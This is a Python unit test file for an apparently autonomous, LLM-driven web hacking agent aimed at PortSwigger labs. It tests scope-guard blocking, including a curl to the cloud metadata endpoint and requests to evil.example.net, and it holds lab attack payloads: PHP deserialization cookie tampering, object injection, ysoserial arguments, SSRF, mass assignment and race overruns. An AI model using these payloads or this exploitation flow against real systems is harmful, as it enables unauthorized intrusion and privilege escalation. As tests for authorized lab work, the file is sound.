import os
import base64
import json
import re
import time
import unittest
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import patch

from hacking_agent.agents.base import BudgetedToolExecutor
from hacking_agent.agents.analyst import AnalystAgent
from hacking_agent.agents.exploitation import ExploitationAgent
from hacking_agent.core.evidence import EvidenceStore
from hacking_agent.cli.lab_eval import DEFAULT_CASES, evaluate_case
from hacking_agent.core.expert_playbooks import EXPERT_PLAYBOOKS, render_playbook_context
from hacking_agent.core.failure import classify_failure
from hacking_agent.core import deserial
from hacking_agent.core import misc_web
from hacking_agent.core.lab_intel import (
    category_playbooks,
    detect_lab_profile,
    detect_target_category,
    extract_credentials,
    normalize_target_input,
)
from hacking_agent.core.memory import AgentMemory
from hacking_agent.core.paths import LOG_DIR
from hacking_agent.core.providers import (
    ProviderRegistry,
    _apply_openai_compatible_params,
    _provider_display_name,
)
from hacking_agent.core.schemas import AgentResult, AgentTask, PoC, ToolDecision
from hacking_agent.core.schemas import CoordinatorDecision, PivotDecision, ProviderConfig
from hacking_agent.core.scope import ScopeGuard, ScopeViolation, RateLimitExceeded
from hacking_agent.core.engagement import (
    Engagement,
    EngagementError,
    engagement_from_dict,
    load_engagement,
)
from hacking_agent.core.state_machine import Event, StateMachine
from hacking_agent.core.subagents import (
    BoundedSubagentScheduler,
    SubagentPolicy,
    SubagentSpec,
)
from hacking_agent.core.tool_catalog import render_tool_catalog
from hacking_agent.core.tools import TOOL_FUNCTIONS, TOOL_SCHEMAS, execute_tool


class EvidenceLifecycleTests(unittest.TestCase):
    def test_validator_refutation_overrides_prior_success(self):
        store = EvidenceStore()
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="claimed exploit",
            response_excerpt="looks good",
            verdict="success",
            agent_name="exploitation",
        ))
        self.assertTrue(store.is_verified("vuln:1"))

        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="REFUTED: claimed exploit",
            response_excerpt="signal was environmental",
            verdict="failure",
            agent_name="validator",
        ))
        self.assertFalse(store.is_verified("vuln:1"))
        self.assertEqual(store.verification_state("vuln:1"), "refuted")

    def test_validator_confirmation_restores_verified_state(self):
        store = EvidenceStore()
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="REFUTED: original",
            response_excerpt="bad signal",
            verdict="failure",
            agent_name="validator",
        ))
        store.record(PoC(
            vuln_id="vuln:1",
            payload="payload",
            request_summary="VALIDATED: replay",
            response_excerpt="causal signal",
            verdict="success",
            agent_name="validator",
        ))
        self.assertTrue(store.is_verified("vuln:1"))


class ScopeGuardTests(unittest.TestCase):
    def test_http_request_out_of_scope_blocks(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        with self.assertRaises(ScopeViolation):
            guard.validate("http_request", {"url": "https://evil.example.net/"})

    def test_shell_direct_metadata_target_blocks(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        with self.assertRaises(ScopeViolation):
            guard.validate("run_shell", {
                "command": "curl -s http://169.254.169.254/latest/meta-data/"
            })

    def test_shell_ssrf_payload_url_does_not_change_direct_target(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("run_shell", {
            "command": (
                "curl -sk -d 'target=http://169.254.169.254/latest/meta-data/' "
                "https://lab.example.com/register"
            )
        })

    def test_bare_ip_target_scopes_shell_tools(self):
        guard = ScopeGuard.from_target_url("10.10.10.10")
        guard.validate("run_shell", {"command": "nmap -sV 10.10.10.10"})
        with self.assertRaises(ScopeViolation):
            guard.validate("run_shell", {"command": "nmap -sV 10.10.10.11"})

    def test_caido_local_send_is_scope_checked(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("caido_local_api", {
            "operation": "send_raw",
            "args": {
                "raw_request": "GET / HTTP/1.1\r\nHost: lab.example.com\r\n\r\n",
                "hostname": "lab.example.com",
            },
        })
        with self.assertRaises(ScopeViolation):
            guard.validate("caido_local_api", {
                "operation": "send_raw",
                "args": {
                    "raw_request": "GET / HTTP/1.1\r\nHost: evil.example.net\r\n\r\n",
                    "hostname": "evil.example.net",
                },
            })

    def test_request_smuggling_probe_is_scope_checked(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        guard.validate("request_smuggling_probe", {
            "url": "https://lab.example.com/",
        })
        with self.assertRaises(ScopeViolation):
            guard.validate("request_smuggling_probe", {
                "url": "https://evil.example.net/",
            })

    def test_budgeted_executor_blocks_before_tool_execution(self):
        guard = ScopeGuard.from_target_url("https://lab.example.com")
        executor = BudgetedToolExecutor(AgentMemory(), StateMachine(), scope_guard=guard)
        outcome = executor.call(
            ToolDecision(
                tool="http_request",
                args={"url": "https://evil.example.net/"},
                reasoning="test scope gate",
                expected_signal="blocked",
            ),
            agent_name="test",
        )
        self.assertTrue(outcome["blocked"])
        self.assertIn("SCOPE VIOLATION", outcome["blocked_reason"])


class TargetParsingTests(unittest.TestCase):
    def test_prefers_explicit_target_marker_over_internal_url(self):
        target, objective = normalize_target_input(
            "Craft SSRF to access http://169.254.169.254/latest/meta-data/ "
            "Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(target, "https://0abc.web-security-academy.net/")
        self.assertIn("169.254.169.254", objective)

    def test_extracts_bare_ctf_box_ip(self):
        target, objective = normalize_target_input(
            "Authorized CTF box: 10.10.10.10. Scope: single host only."
        )
        self.assertEqual(target, "10.10.10.10")
        self.assertIn("single host", objective)

    def test_detects_common_portswigger_profiles(self):
        target = "https://0abc.web-security-academy.net/"
        profile = detect_lab_profile(
            "Blind XXE with out-of-band interaction. Target: " + target,
            target,
        )
        self.assertEqual(profile["id"], "portswigger_blind_xxe_oob")
        self.assertEqual(profile["playbook_id"], "blind_xxe_oob")

        profile = detect_lab_profile(
            "SSRF via OpenID dynamic client registration. Target: " + target,
            target,
        )
        self.assertEqual(profile["id"], "portswigger_oidc_dynamic_client_registration_ssrf")
        self.assertEqual(profile["playbook_id"], "oauth_ssrf_dynamic_registration")

    def test_extracts_lab_credentials_without_confusing_urls(self):
        credentials = extract_credentials(
            "You can log in using wiener:peter. Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(credentials, [{"username": "wiener", "password": "peter"}])

    def test_detects_expert_portswigger_topics(self):
        target = "https://0abc.web-security-academy.net/"
        cases = [
            ("SQL injection lab. Target: " + target, "sqli"),
            ("JWT authentication bypass lab. Target: " + target, "jwt"),
            ("HTTP request smuggling CL.TE lab. Target: " + target, "request_smuggling"),
            ("Web cache poisoning with an unkeyed header. Target: " + target, "web_cache_poisoning"),
            ("Web cache deception lab. Target: " + target, "web_cache_deception"),
            ("Server-side template injection lab. Target: " + target, "ssti"),
            ("Prototype pollution lab. Target: " + target, "prototype_pollution"),
            ("GraphQL introspection authz lab. Target: " + target, "graphql_api"),
            ("Race condition limit-overrun lab. Target: " + target, "race_condition"),
            ("Access control IDOR lab. Target: " + target, "access_control_idor"),
            ("Authentication password reset lab. Target: " + target, "authentication"),
            ("OAuth authentication lab. Target: " + target, "oauth"),
            ("HTTP Host header password reset poisoning lab. Target: " + target, "host_header"),
            ("Information disclosure debug page lab. Target: " + target, "information_disclosure"),
            ("Clickjacking lab. Target: " + target, "clickjacking"),
            ("DOM-based vulnerabilities lab. Target: " + target, "dom_based"),
            ("Reflected XSS lab. Target: " + target, "xss"),
            ("DOM XSS lab. Target: " + target, "dom_xss"),
            ("Path traversal lab. Target: " + target, "path_traversal"),
            ("CORS vulnerability lab. Target: " + target, "cors"),
            ("XML external entity XXE injection lab. Target: " + target, "xxe"),
            ("WebSocket security flaw lab. Target: " + target, "websocket"),
            ("Business logic flaw lab. Target: " + target, "business_logic"),
            ("File upload vulnerability lab. Target: " + target, "file_upload"),
            ("Essential skills mystery lab. Target: " + target, "essential_skills"),
            ("NoSQL injection lab. Target: " + target, "nosql_injection"),
            ("API testing OpenAPI lab. Target: " + target, "api_testing"),
            ("Web LLM attacks prompt injection lab. Target: " + target, "web_llm_attacks"),
            ("OS command injection lab. Target: " + target, "os_command_injection"),
            ("Server-side request forgery SSRF lab. Target: " + target, "ssrf"),
        ]
        for objective, playbook_id in cases:
            with self.subTest(playbook_id=playbook_id):
                profile = detect_lab_profile(objective, target)
                self.assertEqual(profile["playbook_id"], playbook_id)
                self.assertIn("expert_playbook", profile)

    def test_playbook_context_contains_strategy_and_validation(self):
        context = render_playbook_context("request smuggling")
        self.assertIn("primary_tools", context)
        self.assertIn("validation", context)
        self.assertIn("raw", context.lower())

    def test_every_portswigger_topic_from_user_request_has_playbook(self):
        expected = {
            "sqli",
            "xss",
            "csrf",
            "clickjacking",
            "dom_based",
            "cors",
            "xxe",
            "ssrf",
            "request_smuggling",
            "os_command_injection",
            "ssti",
            "path_traversal",
            "access_control_idor",
            "authentication",
            "websocket",
            "web_cache_poisoning",
            "deserialization",
            "information_disclosure",
            "business_logic",
            "host_header",
            "oauth",
            "file_upload",
            "jwt",
            "essential_skills",
            "prototype_pollution",
            "graphql_api",
            "race_condition",
            "nosql_injection",
            "api_testing",
            "web_llm_attacks",
            "web_cache_deception",
        }
        missing = expected.difference(EXPERT_PLAYBOOKS)
        self.assertEqual(missing, set())


class FailureClassificationTests(unittest.TestCase):
    def test_classifies_scope_and_auth_failures(self):
        scope = classify_failure("SCOPE VIOLATION: blocked out of scope request", [])
        self.assertEqual(scope["category"], "scope_blocked")

        auth = classify_failure("403 Forbidden - login required", [])
        self.assertEqual(auth["category"], "auth_required")

    def test_classifies_duplicate_loop_from_recent_failures(self):
        failures = [
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
            {"tool": "http_request", "reason": "no signal", "lesson": "change payload"},
        ]
        result = classify_failure("Still failed", failures)
        self.assertEqual(result["category"], "duplicate_loop")


class LabEvalTests(unittest.TestCase):
    def test_lab_eval_scores_detected_expert_case(self):
        result = evaluate_case(
            "Prototype pollution lab. Target: https://0abc.web-security-academy.net/"
        )
        self.assertEqual(result["playbook_id"], "prototype_pollution")
        self.assertGreaterEqual(result["readiness_score"], 8)

    def test_default_eval_suite_covers_all_user_requested_topics(self):
        results = [evaluate_case(case) for case in DEFAULT_CASES]
        self.assertEqual(len(results), 32)
        bad = [
            (item["name"], item["playbook_id"], item["gaps"])
            for item in results
            if item["readiness_score"] < 8
        ]
        self.assertEqual(bad, [])


class SubagentSchedulerTests(unittest.TestCase):
    def test_runs_safe_subagents_in_parallel(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(max_parallel=2))

        def sleeper(name: str):
            def run():
                time.sleep(0.2)
                return AgentResult(success=True, summary=f"{name} done")
            return run

        started = time.monotonic()
        runs = scheduler.run([
            SubagentSpec(name="a", lane="readiness", run=sleeper("a")),
            SubagentSpec(name="b", lane="analysis", run=sleeper("b")),
        ])
        elapsed = time.monotonic() - started

        self.assertEqual(len(runs), 2)
        self.assertTrue(all(run.success for run in runs))
        self.assertTrue(all(run.parallel for run in runs))
        self.assertLess(elapsed, 0.35)

    def test_state_mutating_subagents_are_serial_by_default(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(max_parallel=2))
        order: list[str] = []

        def mutating(name: str):
            def run():
                order.append(name)
                return AgentResult(success=True, summary=f"{name} done")
            return run

        runs = scheduler.run([
            SubagentSpec(
                name="exploit-a",
                lane="exploitation",
                run=mutating("a"),
                mutates_target=True,
            ),
            SubagentSpec(
                name="exploit-b",
                lane="exploitation",
                run=mutating("b"),
                mutates_target=True,
            ),
        ])

        self.assertEqual(order, ["a", "b"])
        self.assertTrue(all(not run.parallel for run in runs))

    def test_race_condition_can_opt_into_parallel_stateful_lanes(self):
        scheduler = BoundedSubagentScheduler(SubagentPolicy(
            max_parallel=2,
            allow_stateful_parallel=True,
        ))
        runs = scheduler.run([
            SubagentSpec(
                name="race-a",
                lane="exploitation",
                run=lambda: AgentResult(success=True, summary="a"),
                mutates_target=True,
            ),
            SubagentSpec(
                name="race-b",
                lane="exploitation",
                run=lambda: AgentResult(success=True, summary="b"),
                mutates_target=True,
            ),
        ], lab_profile={"playbook_id": "race_condition"})

        self.assertTrue(all(run.parallel for run in runs))


class StateMachineConcurrencyTests(unittest.TestCase):
    def test_tool_call_recording_is_thread_safe(self):
        sm = StateMachine()

        def record_many():
            for _ in range(100):
                sm.record_tool_call("http_request")

        with ThreadPoolExecutor(max_workers=8) as pool:
            list(pool.map(lambda _: record_many(), range(8)))

        self.assertEqual(sm.tool_calls["http_request"], 800)

    def test_tool_budget_reservation_is_atomic(self):
        sm = StateMachine()

        with ThreadPoolExecutor(max_workers=20) as pool:
            results = list(pool.map(lambda _: sm.try_record_tool_call("nuclei_scan"), range(50)))

        self.assertEqual(sum(1 for item in results if item), 5)
        self.assertEqual(sm.tool_calls["nuclei_scan"], 5)


class AnalystProfileFallbackTests(unittest.TestCase):
    def test_profile_driven_analyst_creates_focused_finding(self):
        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        memory.add_entity("Target", {"url": "https://0abc.web-security-academy.net/"})
        profile = detect_lab_profile(
            "HTTP request smuggling CL.TE lab. Target: https://0abc.web-security-academy.net/",
            "https://0abc.web-security-academy.net/",
        )
        analyst = AnalystAgent(
            provider=None,
            memory=memory,
            state_machine=StateMachine(),
            evidence=EvidenceStore(),
        )
        output = analyst.execute(
            AgentTask(
                task_description="Analyze detected lab profile.",
                context={
                    "target_url": "https://0abc.web-security-academy.net/",
                    "lab_profile": profile,
                },
            )
        )
        self.assertTrue(output.success)
        self.assertEqual(len(output.vulnerabilities_found), 1)
        self.assertIn("request smuggling", output.vulnerabilities_found[0].vuln_type.lower())


class ExploitationFastPathTests(unittest.TestCase):
    def test_request_smuggling_fast_path_uses_raw_probe_without_llm(self):
        class FakeExecutor:
            def __init__(self):
                self.calls = []

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                return {
                    "blocked": False,
                    "blocked_reason": "",
                    "signals": None,
                    "result": json.dumps({
                        "success": True,
                        "likely_vulnerability": "cl_te",
                        "evidence_summary": "CL.TE differential response observed.",
                        "baseline": {"statuses": [200, 200], "timed_out": False},
                        "probes": {
                            "cl_te_404": {
                                "statuses": [200, 404],
                                "timed_out": False,
                                "raw_excerpt": "HTTP/1.1 404 Not Found",
                            },
                        },
                    }),
                }

        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "HTTP request smuggling / desync",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "CL.TE request smuggling differential 404 lab.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        evidence = EvidenceStore()
        fake = FakeExecutor()
        profile = detect_lab_profile(
            "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses. "
            "Target: https://0abc.web-security-academy.net/",
            memory.target_url,
        )
        agent = ExploitationAgent(
            provider=None,
            memory=memory,
            state_machine=StateMachine(),
            evidence=evidence,
            tool_executor=fake,
        )

        result = agent.execute(AgentTask(
            task_description="Exploit CL.TE request smuggling and trigger 404.",
            context={"target_url": memory.target_url, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))

        self.assertTrue(result.success)
        self.assertEqual(fake.calls[0].tool, "request_smuggling_probe")
        self.assertEqual(fake.calls[0].args["vector"], "cl_te_404")
        self.assertTrue(evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["status"], "verified")


class DeserializationRoutineTests(unittest.TestCase):
    def test_php_serialize_roundtrip(self):
        blob = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        value = deserial.php_unserialize(blob)
        self.assertEqual(value.class_name, "User")
        self.assertFalse(value.properties["admin"])
        self.assertEqual(deserial.php_serialize(value), blob)

    def test_tamper_flips_admin_and_recomputes_lengths(self):
        blob = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        tampered = deserial.tamper_php_serialized(blob, {"admin": True})
        self.assertEqual(
            tampered,
            'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}',
        )

    def test_tamper_recomputes_string_lengths_for_longer_value(self):
        blob = 'O:4:"User":1:{s:8:"username";s:6:"wiener";}'
        tampered = deserial.tamper_php_serialized(blob, {"username": "administrator"})
        # s:6 must become s:13 (byte length of "administrator").
        self.assertEqual(
            tampered,
            'O:4:"User":1:{s:8:"username";s:13:"administrator";}',
        )

    def test_multibyte_string_length_is_byte_count(self):
        # "é" is 2 UTF-8 bytes, so a 1-char string serializes as s:2.
        self.assertEqual(deserial.php_serialize("é"), 's:2:"é";')
        self.assertEqual(deserial.php_unserialize('s:2:"é";'), "é")

    def test_flip_admin_cookie_roundtrip(self):
        blob = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        cookie = base64.b64encode(blob.encode()).decode()
        flipped = deserial.flip_admin_cookie(cookie)
        decoded = deserial.decode_php_cookie(flipped.replace("%3d", "="))
        self.assertIs(decoded.properties["admin"], True)

    def test_flip_admin_cookie_guards_non_serialized(self):
        self.assertIsNone(deserial.flip_admin_cookie("not-base64-serialized!!"))

    def test_type_juggle_cookie_coerces_token_to_zero(self):
        blob = ('O:4:"User":2:{s:8:"username";s:6:"wiener";'
                's:12:"access_token";s:5:"12345";}')
        cookie = base64.b64encode(blob.encode()).decode()
        juggled = deserial.type_juggle_cookie(cookie)
        decoded = deserial.decode_php_cookie(juggled.replace("%3d", "="))
        self.assertEqual(decoded.properties["access_token"], 0)
        self.assertEqual(decoded.properties["username"], "administrator")

    def test_build_php_object_injection(self):
        payload = deserial.build_php_object(
            "CustomTemplate", {"lock_file_path": "/home/carlos/morale.txt"})
        self.assertEqual(
            payload,
            'O:14:"CustomTemplate":1:{s:14:"lock_file_path";'
            's:23:"/home/carlos/morale.txt";}',
        )

    def test_gadget_candidate_selection(self):
        java = deserial.java_gadget_candidates("Apache Commons deserialization")
        self.assertTrue(java[0].startswith("CommonsCollections"))
        php = deserial.php_chain_candidates("Symfony pre-built chain")
        self.assertTrue(php[0].startswith("Symfony"))
        self.assertEqual(
            deserial.ysoserial_args("CommonsCollections4", "id"),
            {"gadget": "CommonsCollections4", "command": "id", "encode": True},
        )


class MiscWebRoutineTests(unittest.TestCase):
    def test_graphql_endpoint_candidates(self):
        cands = misc_web.graphql_endpoint_candidates("https://lab.net")
        self.assertIn("https://lab.net/graphql", cands)
        self.assertIn("https://lab.net/api", cands)

    def test_introspection_query_shapes(self):
        self.assertIn("__schema", misc_web.introspection_query())
        self.assertIn("__schema", misc_web.introspection_query(minimal=True))

    def test_alias_batch_query_builds_distinct_aliases(self):
        q = misc_web.alias_batch_query("login", "pw", ["a", "b", "c"])
        self.assertIn("a0: login(pw: \"a\")", q)
        self.assertIn("a2: login(pw: \"c\")", q)

    def test_build_query_encodes_scalar_args(self):
        q = misc_web.build_query("getBlogPost", {"id": 3}, ["title", "postPassword"])
        self.assertIn("getBlogPost(id: 3)", q)
        self.assertIn("postPassword", q)

    def test_parse_introspection_and_private_fields(self):
        intro = {"data": {"__schema": {"types": [
            {"name": "BlogPost", "fields": [
                {"name": "title"}, {"name": "postPassword"}]},
            {"name": "__Type", "fields": [{"name": "name"}]},
        ]}}}
        tf = misc_web.parse_introspection(intro)
        self.assertIn("BlogPost", tf)
        self.assertNotIn("__Type", tf)  # introspection meta-types dropped
        self.assertIn(("BlogPost", "postPassword"), misc_web.find_private_fields(tf))

    def test_interpret_race_result_overrun(self):
        overrun = misc_web.interpret_race_result({"status_distribution": {"200": 3, "400": 17}})
        self.assertTrue(overrun["overrun"])
        self.assertEqual(overrun["accepted"], 3)
        single = misc_web.interpret_race_result({"status_distribution": {"200": 1, "400": 19}})
        self.assertFalse(single["overrun"])

    def test_race_plan_bounds_and_mode(self):
        plan = misc_web.race_plan(500, mode="single_packet")
        self.assertEqual(plan["count"], 200)  # capped
        self.assertEqual(plan["mode"], "single_packet")

    def test_sspp_query_payloads(self):
        payloads = dict(misc_web.sspp_query_payloads("email", "wiener"))
        self.assertEqual(payloads["truncate_encoded_hash"], "wiener%23")
        self.assertIn("%26", payloads["append_encoded_amp"])

    def test_sspp_url_payloads(self):
        payloads = dict(misc_web.sspp_url_payloads("123", inject_segment="admin"))
        self.assertEqual(payloads["path_segment"], "123/admin")
        self.assertEqual(payloads["encoded_slash"], "123%2fadmin")

    def test_mass_assignment_payload_and_variants(self):
        body = json.loads(misc_web.mass_assignment_payload({"username": "wiener"}))
        self.assertEqual(body["username"], "wiener")
        self.assertTrue(body["isAdmin"])
        variants = misc_web.mass_assignment_variants({"username": "wiener"})
        self.assertTrue(any('"role": "admin"' in v for v in variants))

    def test_method_variants_excludes_current(self):
        self.assertNotIn("GET", misc_web.method_variants("GET"))
        self.assertIn("DELETE", misc_web.method_variants("GET"))

    def test_llm_hint_is_subvariant_specific(self):
        self.assertIn("agency", misc_web.llm_attack_hint("excessive agency").lower())
        self.assertIn("indirect", misc_web.llm_attack_hint("indirect prompt injection").lower())


class MiscFamilyFastPathTests(unittest.TestCase):
    def _make_agent(self, memory, evidence, executor):
        return ExploitationAgent(
            provider=None,
            memory=memory,
            state_machine=StateMachine(),
            evidence=evidence,
            tool_executor=executor,
        )

    def test_php_deserialization_cookie_tamper_fast_path(self):
        serialized = ('O:4:"User":2:{s:8:"username";s:6:"wiener";'
                      's:5:"admin";b:0;}')
        session_value = base64.b64encode(serialized.encode()).decode()

        class FakeExecutor:
            def __init__(self):
                self.calls = []
                self.deleted = False

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                args = decision.args if isinstance(decision.args, dict) else {}
                url = str(args.get("url", ""))
                method = str(args.get("method", "GET")).upper()
                if "delete" in url and "carlos" in url:
                    self.deleted = True
                if url.endswith("/login") and method == "POST":
                    raw = ("HTTP/1.1 302 Found\r\n"
                           f"Set-Cookie: session={session_value}; Secure; HttpOnly\r\n"
                           "Location: /my-account\r\n\r\n")
                    return {"blocked": False, "blocked_reason": "", "signals": None,
                            "result": json.dumps({"response": raw})}
                if url.rstrip("/").endswith(".net") or url.endswith("/"):
                    body = ("<html><body>"
                            + ("<p class='is-solved'>Congratulations, you solved the lab</p>"
                               if self.deleted else "<h1>My Shop</h1>")
                            + "</body></html>")
                    return {"blocked": False, "blocked_reason": "", "signals": None,
                            "result": json.dumps({"response": body})}
                return {"blocked": False, "blocked_reason": "", "signals": None,
                        "result": json.dumps({"response": "<html>ok</html>"})}

        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "Insecure deserialization",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "PHP serialized session cookie can be tampered.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        evidence = EvidenceStore()
        fake = FakeExecutor()
        profile = {"playbook_id": "deserialization",
                   "subvariant": "modifying serialized objects"}
        agent = self._make_agent(memory, evidence, fake)

        result = agent.execute(AgentTask(
            task_description="Modify the serialized admin flag to gain admin and delete carlos.",
            context={"target_url": memory.target_url, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))

        self.assertTrue(result.success)
        self.assertTrue(evidence.is_verified(vuln.id))
        self.assertEqual(vuln.attrs["status"], "verified")
        # A tampered cookie (admin flipped) must have been sent.
        sent_admin_cookie = any(
            "b:1" in deserial.try_b64_decode(
                (c.args.get("headers", {}) or {}).get("Cookie", "").split("=", 1)[-1]
                .replace("%3d", "=")) if isinstance(c.args, dict)
            and (c.args.get("headers", {}) or {}).get("Cookie") else False
            for c in fake.calls
        )
        self.assertTrue(sent_admin_cookie)

    def test_graphql_fast_path_recovers_private_post(self):
        class FakeExecutor:
            def __init__(self):
                self.calls = []

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                args = decision.args if isinstance(decision.args, dict) else {}
                url = str(args.get("url", ""))
                data = str(args.get("data", ""))
                if url.endswith("/graphql"):
                    if "__typename" in data:
                        return {"blocked": False, "blocked_reason": "", "signals": None,
                                "result": json.dumps({"response": '{"data":{"__typename":"query"}}'})}
                    if "getBlogPost" in data and "id: 3" in data:
                        return {"blocked": False, "blocked_reason": "", "signals": None,
                                "result": json.dumps({"response": '{"data":{"getBlogPost":{"id":3,"title":"secret","postPassword":"h4 x0r"}}}'})}
                    return {"blocked": False, "blocked_reason": "", "signals": None,
                            "result": json.dumps({"response": '{"data":{"getBlogPost":null}}'})}
                # Any other endpoint 404s / not graphql.
                return {"blocked": False, "blocked_reason": "", "signals": None,
                        "result": json.dumps({"response": "<html>not found</html>"})}

        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "GraphQL",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "Private posts accessible over GraphQL.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        evidence = EvidenceStore()
        fake = FakeExecutor()
        profile = {"playbook_id": "graphql_api", "subvariant": "accessing private posts"}
        agent = self._make_agent(memory, evidence, fake)

        result = agent.execute(AgentTask(
            task_description="Access private GraphQL blog posts.",
            context={"target_url": memory.target_url, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))

        self.assertTrue(result.success)
        self.assertTrue(evidence.is_verified(vuln.id))

    def test_race_fast_path_limit_overrun(self):
        class FakeExecutor:
            def __init__(self):
                self.calls = []
                self.raced = False

            def call(self, decision, agent_name, phase="general", iteration=0):
                self.calls.append(decision)
                if decision.tool == "race_send":
                    self.raced = True
                    return {"blocked": False, "blocked_reason": "", "signals": None,
                            "result": json.dumps({"status_distribution": {"200": 4, "400": 16}})}
                args = decision.args if isinstance(decision.args, dict) else {}
                url = str(args.get("url", ""))
                body = ("<p class='is-solved'>Congratulations</p>" if self.raced
                        else "<h1>Shop</h1>")
                return {"blocked": False, "blocked_reason": "", "signals": None,
                        "result": json.dumps({"response": f"<html>{body}</html>"})}

        memory = AgentMemory(target_url="https://0abc.web-security-academy.net/")
        memory.add_entity("Endpoint", {"url": "https://0abc.web-security-academy.net/cart/coupon"})
        target = memory.add_entity("Target", {"url": memory.target_url})
        vuln = memory.add_entity("Vulnerability", {
            "vuln_type": "Race condition",
            "severity": "high",
            "target_entity_id": target.id,
            "hypothesis": "Limit overrun on coupon redemption.",
            "status": "theoretical",
        }, entity_id="vulnerability:1")
        evidence = EvidenceStore()
        fake = FakeExecutor()
        profile = {"playbook_id": "race_condition", "subvariant": "limit-overrun"}
        agent = self._make_agent(memory, evidence, fake)

        result = agent.execute(AgentTask(
            task_description="Limit overrun race on the coupon endpoint.",
            context={"target_url": memory.target_url, "lab_profile": profile},
            target_vulnerability_id=vuln.id,
        ))

        self.assertTrue(result.success)
        self.assertTrue(fake.raced)
        self.assertTrue(evidence.is_verified(vuln.id))

    def test_tool_registry_parity_is_62(self):
        self.assertEqual(len(TOOL_SCHEMAS), 62)
        self.assertEqual(len(TOOL_FUNCTIONS), 62)


class ToolRegressionTests(unittest.TestCase):
    def test_gpt55_uses_max_completion_tokens_for_chat_completions(self):
        cfg = ProviderConfig(
            model="gpt-5.5",
            api_key="test",
            base_url="https://api.openai.com/v1",
        )
        kwargs = {"model": cfg.model, "messages": []}
        _apply_openai_compatible_params(kwargs, cfg)

        self.assertEqual(kwargs["max_completion_tokens"], cfg.max_tokens)
        self.assertNotIn("max_tokens", kwargs)
        self.assertNotIn("temperature", kwargs)

    def test_deepseek_keeps_legacy_max_tokens_param(self):
        cfg = ProviderConfig(
            model="deepseek-v4-pro",
            api_key="test",
            base_url="https://api.deepseek.com",
        )
        kwargs = {"model": cfg.model, "messages": []}
        _apply_openai_compatible_params(kwargs, cfg)

        self.assertEqual(kwargs["max_tokens"], cfg.max_tokens)
        self.assertEqual(kwargs["temperature"], cfg.temperature)
        self.assertNotIn("max_completion_tokens", kwargs)

    def test_openai_provider_display_name_is_not_generic_compatible(self):
        cfg = ProviderConfig(
            model="gpt-5.5",
            api_key="test",
            base_url="https://api.openai.com/v1",
        )

        self.assertEqual(_provider_display_name(cfg), "openai")

    def test_default_reasoning_effort_applies_to_roles_without_role_override(self):
        with patch.dict(os.environ, {
            "LLM_DEFAULT_PROVIDER": "openai",
            "LLM_DEFAULT_MODEL": "gpt-5.5",
            "LLM_DEFAULT_API_KEY": "test",
            "LLM_DEFAULT_BASE_URL": "https://api.openai.com/v1",
            "LLM_DEFAULT_REASONING_EFFORT": "high",
        }, clear=True):
            registry = ProviderRegistry.from_env()

        described = registry.describe()
        self.assertIn("coordinator    -> openai", described)
        self.assertIn("recon          -> openai", described)
        self.assertIn("[effort=high]", described)

    def test_tool_registry_and_schema_count_match_after_caido_local(self):
        self.assertEqual(len(TOOL_FUNCTIONS), len(TOOL_SCHEMAS))
        self.assertIn("caido_local_api", TOOL_FUNCTIONS)
        self.assertIn("request_smuggling_probe", TOOL_FUNCTIONS)

    def test_tool_catalog_prefers_caido_local_over_burp_for_replay(self):
        catalog = render_tool_catalog("general")
        self.assertIn("Caido Local Bridge", catalog)
        self.assertIn("Prefer Caido Local Bridge over Burp MCP", catalog)

    def test_caido_local_unknown_operation_is_stable_json(self):
        raw = execute_tool("caido_local_api", {
            "operation": "unknown",
            "args": {},
        })
        self.assertIn("Unknown Caido local operation", raw)

    def test_analyze_response_tool_imports_package_analyzer(self):
        raw = execute_tool("analyze_response", {
            "response_body": "HTTP/1.1 200 OK\n\nhello <b>probe</b>",
            "payload": "probe",
        })
        self.assertNotIn("No module named 'analyzer'", raw)
        self.assertIn("signals", raw)

    def test_report_log_dir_is_project_log_dir(self):
        from hacking_agent.agents.reporter import ReporterAgent

